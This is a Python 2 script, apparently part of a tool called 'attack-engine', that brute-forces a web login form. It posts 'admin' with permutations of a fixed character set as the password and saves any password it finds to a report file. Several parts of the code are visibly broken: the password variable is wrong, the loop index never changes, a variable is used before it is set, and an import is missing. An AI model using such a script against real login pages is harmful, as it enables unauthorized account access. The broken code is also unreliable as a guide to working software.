#!/usr/bin/env python

import mechanize
import urllib
import itertools
from BeautifulSoup import BeautifulSoup

def BrutforceHtml(url) :
	from detectinput import DetectFormInput
	length=input("enter password length or 'n' for unknown lengh (not recomended for time reasons ! ) \n" )
	names,types,values,destination,method = DetectFormInput(url)
	if destination =="" or destination =="#" : 
		durl = url
	else :
		durl = url+"/"+destination 
	print durl

	i = 0
	for typee in types :
		if typee=="text" and typee != "submit" and typee !="button":
			nameu=names[i]
		elif typee == "password":
			namep=names[i] 

	usertosend="admin"
	passtosend=itertools.permutations("i34^UhP#",length)
	br = BeautifulSoup(fp)
	for x in passtosend :	
		post_params = {
	    	nameu : usertosend,
	    	namep : passtosend
			}
		post_args = urllib.urlencode(post_params)
		fp = urllib.urlopen(durl, post_args)	
		print "Checking ",br.form['password']
		response=br.submit()
		if response.geturl()=="":
			#url to which the page is redirected after login
			print "Correct password is ",''.join(x)
			if (os.path.exists('~/attack-engine1/outputFiles/bruteForceRepport.txt') == False ):
				os.system('touch ~/attack-engine1/outputFiles/bruteForceRepport.txt')
			path = os.path.join(os.path.expanduser('~'), 'attack-engine1', 'outputFiles','bruteForceRepport.txt')	
			Res="the brute forced password for the link :" + url+"is :\n"+x
			with open(path, "w") as text_file:
				text_file.write("%s" % x)		
			break

	soup = BeautifulSoup(fp)
	print soup

